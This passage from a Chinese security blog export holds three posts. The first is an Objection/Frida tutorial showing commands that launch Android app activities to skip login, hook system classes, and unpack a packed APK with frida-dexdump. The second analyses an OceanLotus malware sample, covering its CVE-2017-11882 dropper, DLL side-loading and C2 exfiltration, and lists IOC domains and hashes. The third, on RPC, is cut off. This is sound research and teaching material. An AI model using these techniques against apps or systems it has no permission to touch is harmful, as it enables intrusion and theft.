frida-agent-64.so                                                      0x7435ca6000  20021248 (19.1 MiB)  /data/local/tmp/re.frida.server/frida-agent-64.so
</code></pre>
</li>
</ul>
</li>
<li><p>有时候frida-server连接错误需要重启</p>
<pre><code class="bash">|marlin:/data/local/tmp # netstat -tulpn | grep :8888
tcp        0      0 0.0.0.0:8888            0.0.0.0:*               LISTEN      9711/fs-12
tcp       40      0 127.0.0.1:41385         127.0.0.1:8888          ESTABLISHED 27125/com.cz.babySister
tcp        0      0 127.0.0.1:8888          127.0.0.1:41385         ESTABLISHED 9711/fs-12

marlin:/data/local/tmp # kill -9 9711

marlin:/data/local/tmp # ./fs-12 -l 0.0.0.0:8888 &amp;                                                                                                
[2] 4204
[1] - Killed               ./fs -l 0.0.0.0:8888 
</code></pre>
</li>
<li><p>检索activities，如果app没有做限制可以绕过登录直接跳转到目标activity</p>
<pre><code class="bash">┌──(kali㉿kali)-[~]
└─$ objection -N -h 192.168.1.7 -p 8888 -g com.cz.babySister explore
Using networked device @`192.168.1.7:8888`
Agent injected and responds ok!
   
     _   _         _   _
 ___| |_|_|___ ___| |_|_|___ ___
| . | . | | -_|  _|  _| | . |   |
|___|___| |___|___|_| |_|___|_|_|
      |___|(object)inject(ion) v1.8.4
   
     Runtime Mobile Exploration
        by: @leonjza from @sensepost
   
[tab] for command suggestions
com.cz.babySister on (google: 10) [net] # android hooking list activities                                                              
com.alipay.sdk.app.AlipayResultActivity
com.alipay.sdk.app.H5AuthActivity
com.alipay.sdk.app.H5OpenAuthActivity
com.alipay.sdk.app.H5PayActivity
...
com.cz.babySister.wxapi.WXEntryActivity
com.tencent.connect.common.AssistActivity
com.tencent.smtt.sdk.VideoActivity
com.tencent.tauth.AuthActivity
   
Found 55 classes
com.cz.babySister on (google: 10) [net] # android intent launch_activity com.cz.babySister.activity.MessageActivity                    
(agent) Starting activity com.cz.babySister.activity.MessageActivity...
(agent) Activity successfully asked to start.
com.cz.babySister on (google: 10) [net] # android intent launch_activity com.cz.babySister.activity.JiFenActivity                      
(agent) Starting activity com.cz.babySister.activity.JiFenActivity...
(agent) Activity successfully asked to start.
com.cz.babySister on (google: 10) [net] #                                                                                              
com.cz.babySister on (google: 10) [net] # android intent launch_activity com.cz.babySister.wxapi.WXEntryActivity                       
(agent) Starting activity com.cz.babySister.wxapi.WXEntryActivity...
(agent) Activity successfully asked to start.
com.cz.babySister on (google: 10) [net] # android intent launch_activity com.cz.babySister.activity.ChengRenVideoActivity              
(agent) Starting activity com.cz.babySister.activity.ChengRenVideoActivity...
(agent) Activity successfully asked to start.
com.cz.babySister on (google: 10) [net] #  
</code></pre>
<ul>
<li><p>就像这个如果app没有做限制的话，就算没有登陆也可以在这些activity之间进行跳转</p>
<img src="/2023/11/11/Objection%E7%8E%AF%E5%A2%83%E3%80%81%E8%87%AA%E5%8A%A8%E5%8C%96%E5%88%86%E6%9E%90%E5%92%8C%E6%8F%92%E4%BB%B6/image-20231112101820878.png" class="" title="image-20231112101820878">
</li>
<li><p>不过这种现在比较少了，大部分app都做了处理</p>
</li>
</ul>
</li>
<li><p>用frida连接手机的时候，也可以通过<code>jnettop</code>查看连接的ip、端口、流量大小</p>
<img src="/2023/11/11/Objection%E7%8E%AF%E5%A2%83%E3%80%81%E8%87%AA%E5%8A%A8%E5%8C%96%E5%88%86%E6%9E%90%E5%92%8C%E6%8F%92%E4%BB%B6/image-20231112101923057.png" class="" title="image-20231112101923057">
</li>
<li><p>取消jobs的命令是<code>jobs kill job ID</code></p>
<pre><code class="bash">com.android.settings on (google: 10) [net] # jobs list                                                                                
Job ID       Hooks  Type
-----------  -----  -----------------------------------------------------------
7292iblia76     63  watch-class for: android.bluetooth.BluetoothDevice
k24tk3ywand      1  watch-method for: android.bluetooth.BluetoothDevice.getName
iargrzfrte       6  watch-method for: java.io.File.$init
com.android.settings on (google: 10) [net] # jobs kill 
7292iblia76                                                        
com.android.settings on (google: 10) [net] # jobs list                                                                                
Job ID       Hooks  Type
-----------  -----  -----------------------------------------------------------
k24tk3ywand      1  watch-method for: android.bluetooth.BluetoothDevice.getName
iargrzfrte       6  watch-method for: java.io.File.$init
</code></pre>
</li>
<li><p>对基础库的hook可以得到非常多的信息</p>
<pre><code class="bash">com.android.settings on (google: 10) [net] # android hooking 
watch class_method java.io.File.$init --dump-args                        
(agent) Attempting to watch class java.io.File and method 
$init.
(agent) Hooking java.io.File.$init(java.io.File, java.lang.String)
(agent) Hooking java.io.File.$init(java.lang.String)
(agent) Hooking java.io.File.$init(java.lang.String, int)
(agent) Hooking java.io.File.$init(java.lang.String, java.io.File)
(agent) Hooking java.io.File.$init(java.lang.String, java.lang.String)
(agent) Hooking java.io.File.$init(java.net.URI)
(agent) Registering job x8s8vp7qpzc. Type: watch-method for: java.io.File.$init
com.android.settings on (google: 10) [net] # jobs list                                                                                
Job ID       Hooks  Type
-----------  -----  ------------------------------------
x8s8vp7qpzc      6  watch-method for: java.io.File.$init
</code></pre>
<p>例如：在设置里面执行操作</p>
<img src="/2023/11/11/Objection%E7%8E%AF%E5%A2%83%E3%80%81%E8%87%AA%E5%8A%A8%E5%8C%96%E5%88%86%E6%9E%90%E5%92%8C%E6%8F%92%E4%BB%B6/image-20231112102242814.png" class="" title="image-20231112102242814"></li>
</ol>
<ul>
<li><code>hook</code>了<code>File</code>构造器的所有重载,，在设置界面随意进出几个子设置界面，可以看到命中很多次该方法的不同重载，每次参数的值也都不同</li>
</ul>
</blockquote>
<h2 id="插件使用"><a href="#插件使用" class="headerlink" title="插件使用"></a>插件使用</h2><p>objection和frida都可以加载插件使用。具体情况看插件的readme会说明使用方法</p>
<h3 id="Wallbreaker使用"><a href="#Wallbreaker使用" class="headerlink" title="Wallbreaker使用"></a>Wallbreaker使用</h3><p><a href="https://github.com/hluwa/Wallbreaker.git">下载插件</a>，然后加载就可以使用了</p>
<pre><code class="bash">┌──(kali㉿kali)-[~/Downloads/Wallbreaker]
└─$ objection -N -h 192.168.1.3 -p 8888 -g com.android.settings explore
Using networked device @`192.168.1.3:8888`
Agent injected and responds ok!

     _   _         _   _
 ___| |_|_|___ ___| |_|_|___ ___
| . | . | | -_|  _|  _| | . |   |
|___|___| |___|___|_| |_|___|_|_|
      |___|(object)inject(ion) v1.8.4

     Runtime Mobile Exploration
        by: @leonjza from @sensepost

[tab] for command suggestions
com.android.settings on (google: 10) [net] # plugin load /home/kali/Downloads/Wallbreaker 
                                                                                                                                      
Loaded plugin: wallbreaker
</code></pre>
<p>加载完就可以使用了</p>
<img src="/2023/11/11/Objection%E7%8E%AF%E5%A2%83%E3%80%81%E8%87%AA%E5%8A%A8%E5%8C%96%E5%88%86%E6%9E%90%E5%92%8C%E6%8F%92%E4%BB%B6/image-20231111170207935.png" class="" title="image-20231111170207935">

<img src="/2023/11/11/Objection%E7%8E%AF%E5%A2%83%E3%80%81%E8%87%AA%E5%8A%A8%E5%8C%96%E5%88%86%E6%9E%90%E5%92%8C%E6%8F%92%E4%BB%B6/image-20231111170756781.png" class="" title="image-20231111170756781">

<ul>
<li>可以查看感兴趣的类的包名、成员变量和属性信息等等，可以对一个类进行一个基本的了解</li>
</ul>
<h3 id="frida-dexdump脱壳插件"><a href="#frida-dexdump脱壳插件" class="headerlink" title="frida-dexdump脱壳插件"></a>frida-dexdump脱壳插件</h3><p>安装<a href="https://github.com/hluwa/frida-dexdump">frida-dexdump脱壳插件</a></p>
<p><code>pip3 install frida-dexdump</code></p>
<blockquote>
<p>下载的时候我们安装一个带壳的apk等下测试</p>
<img src="/2023/11/11/Objection%E7%8E%AF%E5%A2%83%E3%80%81%E8%87%AA%E5%8A%A8%E5%8C%96%E5%88%86%E6%9E%90%E5%92%8C%E6%8F%92%E4%BB%B6/image-20231111171933540.png" class="" title="image-20231111171933540">

<ul>
<li><p>安装完之后运行</p>
</li>
<li><p>用objection检索一下包中的类名：大部分都已经被壳替换掉了</p>
<img src="/2023/11/11/Objection%E7%8E%AF%E5%A2%83%E3%80%81%E8%87%AA%E5%8A%A8%E5%8C%96%E5%88%86%E6%9E%90%E5%92%8C%E6%8F%92%E4%BB%B6/image-20231111175037981.png" class="" title="image-20231111175037981">

<ul>
<li>com.cz.babySister.alipay.PayActivity（阿里支付）、com.cz.babySister.interfaces.JiFenInterFaces（积分），可以看到一些登陆注册、支付等activity，不过大部分都被无意义的字母替换掉了</li>
</ul>
</li>
</ul>
<p><strong>下载完使用脱壳工具frida-dexdump脱壳</strong></p>
<p><strong>关于脱壳命令:</strong></p>
<ul>
<li>指定App的应用名称：frida-dexdump -U -n 保利票务</li>
<li>指定App的应用进程ID：frida-dexdump -U -p 3302</li>
<li>指定App的应用包名：frida-dexdump -U -f com.iCitySuzhou.suzhou001</li>
</ul>
<pre><code class="bash">┌──(kali㉿kali)-[~/Downloads]
└─$ frida-dexdump -H 192.168.1.3:8888 -f com.cz.babySister     

-----------------------------------------------------------------------------------------------------------------------------------
                                __      _     _                 _              _                                                    
                              / _|_ __(_) __| | __ _        __| | _____  ____| |_   _ _ __ ___  _ __                               
                             | |_| '__| |/ _` |/ _` |_____ / _` |/ _ \ \/ / _` | | | | '_ ` _ \| '_ \                              
                             |  _| |  | | (_| | (_| |_____| (_| |  __/&gt;  &lt; (_| | |_| | | | | | | |_) |                             
                             |_| |_|  |_|\__,_|\__,_|      \__,_|\___/_/\_\__,_|\__,_|_| |_| |_| .__/                              
                                                                                               |_|                                 
                                               https://github.com/hluwa/frida-dexdump                                              
-----------------------------------------------------------------------------------------------------------------------------------

Spawning `com.cz.babySister`...                                         
INFO:Agent:DexDumpAgent&lt;Connection(pid=Session(pid=27125), connected:True), attached=True&gt;: Attach.
INFO:frida-dexdump:Waiting 5s...
INFO:frida-dexdump:[+] Searching...
INFO:frida-dexdump:[*] Successful found 16 dex, used 13 time.
INFO:frida-dexdump:[+] Starting dump to '/home/kali/Downloads/com.cz.babySister'...
INFO:frida-dexdump:[+] DexMd5=e00b57c04166adc8236012e872f01df4, SavePath=/home/kali/Downloads/com.cz.babySister/classes.dex, DexSize=0x9e74c
INFO:frida-dexdump:[+] DexMd5=735418c3b52a60e8497a6746cdd940a0, SavePath=/home/kali/Downloads/com.cz.babySister/classes02.dex, DexSize=0x6c022c
INFO:frida-dexdump:[+] DexMd5=425e63748a44957ba9000e325479c997, SavePath=/home/kali/Downloads/com.cz.babySister/classes03.dex, DexSize=0x551eb4
INFO:frida-dexdump:[+] DexMd5=a2fa46881e6a15401a35e782d91a5c30, SavePath=/home/kali/Downloads/com.cz.babySister/classes04.dex, DexSize=0xba28
INFO:frida-dexdump:[+] DexMd5=c155bf12df19e0f311c4859bb3690be0, SavePath=/home/kali/Downloads/com.cz.babySister/classes05.dex, DexSize=0x35a70
INFO:frida-dexdump:[+] DexMd5=f1771b68f5f9b168b79ff59ae2daabe4, SavePath=/home/kali/Downloads/com.cz.babySister/classes06.dex, DexSize=0x11c
INFO:frida-dexdump:[+] DexMd5=7b3196f88e671b759185123f53ac9d13, SavePath=/home/kali/Downloads/com.cz.babySister/classes07.dex, DexSize=0xba28
Set read permission for memory range: 0x77e532add0-0x77e56d4000
Set read permission for memory range: 0x77e532add0-0x77e57d0000
Set read permission for memory range: 0x77e532add0-0x77e5831000
ERROR:frida-dexdump:[-] Error: access violation accessing 0x77e53ee000
    at frida/runtime/core.js:144
    at frida/runtime/message-dispatcher.js:15
    at c (frida/runtime/message-dispatcher.js:25): {'addr': '0x77e532add0', 'size': 5609016}
Traceback (most recent call last):
  File "/home/kali/.pyenv/versions/3.8.0/lib/python3.8/site-packages/frida_dexdump/__main__.py", line 81, in dump
    bs = self.agent.memory_dump(dex['addr'], dex['size'])
  File "/home/kali/.pyenv/versions/3.8.0/lib/python3.8/site-packages/frida_dexdump/agent/__init__.py", line 24, in memory_dump
    return self._rpc.memorydump(base, size)
  File "/home/kali/.pyenv/versions/3.8.0/lib/python3.8/site-packages/frida/core.py", line 401, in method
    return script._rpc_request('call', js_name, args, **kwargs)
  File "/home/kali/.pyenv/versions/3.8.0/lib/python3.8/site-packages/frida/core.py", line 26, in wrapper
    return f(*args, **kwargs)
  File "/home/kali/.pyenv/versions/3.8.0/lib/python3.8/site-packages/frida/core.py", line 333, in _rpc_request
    raise result[2]
frida.core.RPCException: Error: access violation accessing 0x77e53ee000
    at frida/runtime/core.js:144
    at frida/runtime/message-dispatcher.js:15
    at c (frida/runtime/message-dispatcher.js:25)
INFO:frida-dexdump:[+] DexMd5=8345c73b46814e1384ff8462248b23af, SavePath=/home/kali/Downloads/com.cz.babySister/classes08.dex, DexSize=0x695a8
INFO:frida-dexdump:[+] DexMd5=ecf7cddd075183ac84db1677966211d0, SavePath=/home/kali/Downloads/com.cz.babySister/classes09.dex, DexSize=0x1274a4
INFO:frida-dexdump:[+] DexMd5=e920130e06b5687afe980ddb8e3b4425, SavePath=/home/kali/Downloads/com.cz.babySister/classes10.dex, DexSize=0x1557b4
INFO:frida-dexdump:[+] DexMd5=fd1b06e77f97579a960bb5029b46cc33, SavePath=/home/kali/Downloads/com.cz.babySister/classes11.dex, DexSize=0x325530
INFO:frida-dexdump:[+] DexMd5=7e343cbc45b618d05182d74bd61826b2, SavePath=/home/kali/Downloads/com.cz.babySister/classes12.dex, DexSize=0x4b7700
INFO:frida-dexdump:[+] DexMd5=2dd14f384bfe4741e5a9463e12c79c89, SavePath=/home/kali/Downloads/com.cz.babySister/classes13.dex, DexSize=0xecfc
INFO:frida-dexdump:[+] DexMd5=b93f8047ed660629c2efe0aef2bbe0e4, SavePath=/home/kali/Downloads/com.cz.babySister/classes14.dex, DexSize=0x63194
INFO:frida-dexdump:[*] All done...
</code></pre>
<ul>
<li><p>脱完壳之后可以看到脱出来了很多个dex文件</p>
</li>
<li><p>我们搜索一下MainActivity在哪个文件里面</p>
<img src="/2023/11/11/Objection%E7%8E%AF%E5%A2%83%E3%80%81%E8%87%AA%E5%8A%A8%E5%8C%96%E5%88%86%E6%9E%90%E5%92%8C%E6%8F%92%E4%BB%B6/image-20231111195143368.png" class="" title="image-20231111195143368"></li>
</ul>
<p><strong>使用jadx打开这两个dex文件</strong></p>
<blockquote>
<p>打开失败：checksum出错了</p>
<img src="/2023/11/11/Objection%E7%8E%AF%E5%A2%83%E3%80%81%E8%87%AA%E5%8A%A8%E5%8C%96%E5%88%86%E6%9E%90%E5%92%8C%E6%8F%92%E4%BB%B6/image-20231111195106060.png" class="" title="image-20231111195106060">

<ul>
<li><p>那暂时先把checksum关掉</p>
<p>位置：File(文件 )&gt; Preferences(首选项)：<strong>快捷键（CTRL+shift+P）</strong></p>
<img src="/2023/11/11/Objection%E7%8E%AF%E5%A2%83%E3%80%81%E8%87%AA%E5%8A%A8%E5%8C%96%E5%88%86%E6%9E%90%E5%92%8C%E6%8F%92%E4%BB%B6/image-20231111195725856.png" class="" title="image-20231111195725856">
</li>
<li><p>再重新打开一遍就可以正常显示了</p>
<img src="/2023/11/11/Objection%E7%8E%AF%E5%A2%83%E3%80%81%E8%87%AA%E5%8A%A8%E5%8C%96%E5%88%86%E6%9E%90%E5%92%8C%E6%8F%92%E4%BB%B6/image-20231111200443085.png" class="" title="image-20231111200443085">

<ul>
<li>可以直接搜索定位到我们的MainActivity等方法</li>
</ul>
</li>
</ul>
<p>或者我们使用GDA工具也同样可以打开</p>
<img src="/2023/11/11/Objection%E7%8E%AF%E5%A2%83%E3%80%81%E8%87%AA%E5%8A%A8%E5%8C%96%E5%88%86%E6%9E%90%E5%92%8C%E6%8F%92%E4%BB%B6/image-20231111201125885.png" class="" title="image-20231111201125885">
</blockquote>
</blockquote>
<p>参考文章：</p>
<p><a href="https://bbs.huaweicloud.com/blogs/386134#H113">Frida-Dexdump 脱壳工具下载使用以及相关技术介绍</a></p>
<p><a href="https://www.anquanke.com/post/id/197657">实用FRIDA进阶：内存漫游、hook anywhere、抓包</a></p>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>Frida逆向与利用自动化</tag>
        <tag>环境搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>Ocean Lotus样本分析</title>
    <url>/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="0x00样本简介"><a href="#0x00样本简介" class="headerlink" title="0x00样本简介"></a>0x00样本简介</h2><p>​    该样本是2018年5月份国内某安全厂商威胁情报系统捕获的一起针对中国及其他东亚地区国家政府、科研单位领域的攻击样本，该APT组织确认为APT-32（海莲花OceanLotus）。<br>​    此次攻击载体选用的是.doc后缀的rtf文件，该rtf文件通过利用漏洞CVE-2017-11882释放恶意文件到本地并加载执行。其释放文件利用了白加黑的组合加载手法逃避杀软的查杀，在运行过程中并无我们常见的多级注入行为，也并没有文件落地，具有较强的隐蔽性。原始样本信息如表１所示。</p>
<table>
<thead>
<tr>
<th>文件名称</th>
<th>Document_GPI Invitation-UNSOOC China.doc</th>
</tr>
</thead>
<tbody><tr>
<td>Md5</td>
<td>02ae075da4fb2a6d38ce06f8f40e397e</td>
</tr>
<tr>
<td>文件类型</td>
<td>Rtf</td>
</tr>
</tbody></table>
<center>表1</center>

<span id="more"></span>

<h2 id="0x01攻击流程"><a href="#0x01攻击流程" class="headerlink" title="0x01攻击流程"></a>0x01攻击流程</h2><p>该样本首先通过利用Office公式编辑器模块在解析公式名时候出现的栈溢出漏洞CVE-2017-11882释放三个文件（MicrosoftWindowsDiskDiagnosticResolver.exe，rastls.dll和OUTLFLTR.DAT）到本地临时目录，然后执行释放的PE文件。MicrosoftWindowsDiskDiagnosticResolver.exe是一个拥有合法签名的PE文件，该PE文件运行期间会加载rastls.dll（注意系统目录下也有一个同名DLL）。rastls.dll模块DllMain会将宿主PE的代码段内容进行CSP加密混淆，并且会hook代码段后续一个位置，劫持EIP至DLL里面的函数，继而加载OUTLFLTR.DAT。然后从OUTLFLTR.DAT解密出shellcode1，跳转执行shellcode1.后续将.DAT文件解密变形出多个DLL文件，这些内存中的DLL文件将导入网络功能、注册表功能等所需的系统资源DLL。最终将执行其窃密、远控等恶意功能。其运行流程如下图所示。</p>
<img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/1.png" class="" title="img">

<center>图1 样本执行流程</center>



<h2 id="0x02详细分析"><a href="#0x02详细分析" class="headerlink" title="0x02详细分析"></a>0x02详细分析</h2><p>漏洞部分该报告不分析，我们直接分析其释放文件。</p>
<p>MicrosoftWindowsDiskDiagnosticResolver.exe是一个白签名文件（如图2所示），我们从rastls.dll着手分析。调试器挂载MicrosoftWindowsDiskDiagnosticResolver.exe，跟进rastls.dll模块，结合IDA反汇编可以快速跟踪到对宿主代码段加密部分（图3）。</p>
<img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2.png" class="" title="img">

<center>图2 文件签名信息和VT检测信息</center>





<img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/3.png" class="" title="img">

<center>图3 对宿主PE.text段加密混淆</center>



<p>然后修改0x40c19b处的代码为call sub_6e771ed0。</p>
<img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/4.png" class="" title="img">

<center>图4 劫持宿主EIP</center>

<p>sub_6e771ed0是rastls.dll中的函数，IDA可观察到明显的文件操作行为。</p>
<img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/5.png" class="" title="img">

<center>图5 sub_6e771ed0函数（图中偏移0x1ED0即sub_10001ED0）</center>

<p>在sub_6e771ed0内部下断或下断文件操作相关API，可跟踪到程序调用CreateFileW加载OUTLFLTR.DAT文件（图6）</p>
<img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/6.png" class="" title="img">

<center>图6 加载OUTLFLTR.DAT</center>



<p>随后将在OUTLFLTR.DAT文件中提取处指定位置资源解析出相应的shellcode1（图7），并跳转执行shellcode（图8）。</p>
<img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/7.png" class="" title="img">

<center>图7 解密提取shellcode</center>

<img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/8.png" class="" title="img">

<center>图8 跳转到对缓冲区的shellcode执行</center>



<p>Shellcode1中继续从提取的资源中解密出第一个动态链接库文件，名为{92BA1818-0119-4F79-874E-E3BF79C355B8}.dll。跳转到经PE解析得到的该DLL的OEP位置。DLLMain函数并无特殊功能，其提供的大量局部函数片段将服务shellocde。</p>
<img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/9.png" class="" title="img">

<center>图9 找到第一个DLL资源（{92BA1818-0119-4F79-874E-E3BF79C355B8}.dll）</center>

<img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/10.png" class="" title="img">

<center>图10 修复IAT之后跳入{92BA1818-0119-4F79-874E-E3BF79C355B8}.dll OEP</center>



<p>此时我们Dump出修复之后的DLL文件（可对VirtualProtect下断快速找到堆区的DLL文件）。修改Dump文件的文件对齐即各区段偏移之后，直接IDA反汇编以辅助我们动态跟踪。</p>
<img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/11.png" class="" title="img">

<center>图10 IDA反汇编中找到的DLL签名信息</center>



<p>执行完{92BA1818-0119-4F79-874E-E3BF79C355B8}.dll DllEntry之后，返回至shellcode1，后续将调用{92BA1818-0119-4F79-874E-E3BF79C355B8}.dll中的构造好的代码片段寻找第二个DLL资源。</p>
<img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/11.png" class="" title="img">

<center>图11 寻找第二个DLL资源</center>



<p>找到第二个DLL之后，程序流会解密出第二段shellcode2，跳转执行shellcode2，然后修复找到的DLL，跳转到新的DLL OEP。</p>
<img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/12.png" class="" title="img">

<center>图12 解密出shellcode2，跳转执行</center>

<img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/13.png" class="" title="img">

<center>图13 跳入修复后的DLL（{A96B020F-0000-466F-A96D-A91BBF8EAC96}.dll）</center>



<img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/14.png" class="" title="img">

<center>图14 {A96B020F-0000-466F-A96D-A91BBF8EAC96}.dll签名信息</center>



<p>{A96B020F-0000-466F-A96D-A91BBF8EAC96}.dll与第一个DLL类似，其DllEntry无特别作用，但是它提供了针对源资源的解密方法，后续的程序流程中将调用揭秘方法解密出敏感信息（如网络相关的CC）。此外该DLL将会继续解密提取出三个网络相关的动态链接库文件。</p>
<img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/14.1.png" class="" title="img">

<center>图14 位于{A96B020F-0000-466F-A96D-A91BBF8EAC96}.dll内的资源解密函数</center>



<p>继续解密修复第三个DLL资源。</p>
<img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/15.png" class="" title="img">

<center>图15 解密出的第三个DLL（HttpProv.dll）</center>



<img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/16.png" class="" title="img">

<center>图16 HttpProv.dll签名信息</center>

<p>HttpProv.dll提供了一个重要的导出函数CreateInstance。</p>
<img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/17.png" class="" title="img">

<center>图17 HttpProv.dll-&gt;CreateInstance</center>

<img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/18.png" class="" title="img">

<center>图18 创建新的线程</center>



<p>解密出第四个DLL资源。</p>
<img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/19.png" class="" title="img">

<center>图19 跳转执行DnsProvider.dll OEP</center>

<img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/20.png" class="" title="img">

<center>图20 DnsProvider.dll签名信息</center>



<p>设置图标资源相关的注册表值选用REG_OPTION_NON_VOLATILE方式，即只在内存中有效，无实际注册表修改。猜测这应该也是一种隐蔽自身的手段。</p>
<img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/21.png" class="" title="img">

<center>图21 注册表设置</center>

<p>解密出最后一个DLL资源。</p>
<img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/22.png" class="" title="img">

<center>图22 HttpProv.dll</center>

<img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/23.png" class="" title="img">

<center>图23 HttpProv.dll签名信息</center>



<p>解密出的这些DLL文件在其初始化过程中将会载入网络模块相关系统资源，然后将进行本地数据上传、远程CC连接等行为。</p>
<img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/24.png" class="" title="img">

<center>图24我们待资源解密之后提取的敏感信息</center>



<img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/25.png" class="" title="img">

<center>图25 远程CC服务器连接</center>

<img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/26.png" class="" title="img">

<center>图26 将本地用户信息加密之后上传</center>

<img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/27.png" class="" title="img">

<center>图27 远程域名请求行为</center>



<h2 id="0x03-IOC"><a href="#0x03-IOC" class="headerlink" title="0x03 IOC"></a>0x03 IOC</h2><p>网络C2</p>
<table>
<thead>
<tr>
<th>回连域名</th>
<th>andreagahuvrauvin.comstraliaenollma.xyzbyronorenstein.com</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>释放文件及中间件哈希</p>
<table>
<thead>
<tr>
<th>文件名</th>
<th>MD5</th>
</tr>
</thead>
<tbody><tr>
<td>MicrosoftWindowsDiskDiagnosticResolver.exe</td>
<td>62944e26b36b1dcace429ae26ba66164</td>
</tr>
<tr>
<td>OUTLFLTR.DAT</td>
<td>b10f93cdbcdf43d4c5c5770872e239f4</td>
</tr>
<tr>
<td>rastls.dll</td>
<td>f775cc387a55831386e44dd00ef9723e</td>
</tr>
<tr>
<td>{92BA1818-0119-4F79-874E-E3BF79C355B8}.dll</td>
<td>93b6996fe1f5a91400b76f4a56f56a0c</td>
</tr>
<tr>
<td>{A96B020F-0000-466F-A96D-A91BBF8EAC96}.dll</td>
<td>76a4d8da378ad191e3d93d210c217e59</td>
</tr>
<tr>
<td>HttpProv.dll</td>
<td>b8df4f077f900878871dddea14774bc5</td>
</tr>
<tr>
<td>DnsProvider.dll</td>
<td>a5ad1094870ffaa5129b51a840d497cd</td>
</tr>
<tr>
<td>HttpProv.dll</td>
<td>c2941048fa90d98147e8f0790b708657</td>
</tr>
</tbody></table>
<h2 id="0x04总结"><a href="#0x04总结" class="headerlink" title="0x04总结"></a>0x04总结</h2><p>此次捕获的由APT组织海莲花针对我国发起的攻击活动的高危情报，该样本选用伪装成doc文件的RTF文档作为攻击载体，利用了常见的栈溢出漏洞CVE-2017-11882，当用户打开后缀为.doc的文档时，若没有更新该漏洞补丁则会触发漏洞释放内嵌的资源文件到本地。释放文件采用了白利用技术绕过常规杀软检测，在木马运行过程中无文件落地并且也没有进行常规木马的可信进程注入行为。解析的shellcode存在较多的加密混淆操作，后续的窃密远控行为分为多线程执行，其执行流程在内存中解密出的多模块间跳转，这些操作一定程度上加大了逆向分析难度。总结来说，该样本具有较强的隐蔽性，较高的稳定性，其蓄谋攻击可见一斑。</p>
]]></content>
      <categories>
        <category>样本分析</category>
      </categories>
      <tags>
        <tag>windows木马</tag>
        <tag>OceanLotus</tag>
      </tags>
  </entry>
  <entry>
    <title>RPC概念和实例</title>
    <url>/2023/11/24/RPC%E6%A6%82%E5%BF%B5%E5%92%8C%E5%AE%9E%E4%BE%8B/</url>
    <content><![CDATA[<p>本章来看一下RPC相关的问题</p>
<p>RPC远程过程调用，是一种计算机通信协议，用于在计算机网络中的程序之间进行通信。它允许程序调用另一个地址空间（通常是远程机器上的程序）的过程，就像调用本地过程一样，而无需显式地处理网络细节。</p>
<p>在RPC中，客户端程序调用远程服务器上的过程，就像调用本地过程一样。RPC框架负责将参数传递给远程过程并返回结果。这使得分布式计算变得更加容易，因为开发人员可以将远程调用抽象为本地调用，而不必去关心底层网络通信的实现细节。</p>
<span id="more"></span>

<img src="/2023/11/24/RPC%E6%A6%82%E5%BF%B5%E5%92%8C%E5%AE%9E%E4%BE%8B/image-20231122204524604.png" class="" title="image-20231122204524604">

<ul>
<li>在进行RPC之前，要先把问题在hook和主动调用阶段解决，然后再去进行RPC的互联</li>
</ul>
<hr>
<h2 id="远程调用"><a href="#远程调用" class="headerlink" title="远程调用"></a>远程调用</h2><p>这里拿<a href="https://github.com/xiaoeeyu/lesson4_4">lesson4</a>编写的apk来进行RPC调用测试</p>
<p>调用<code>secret()</code></p>
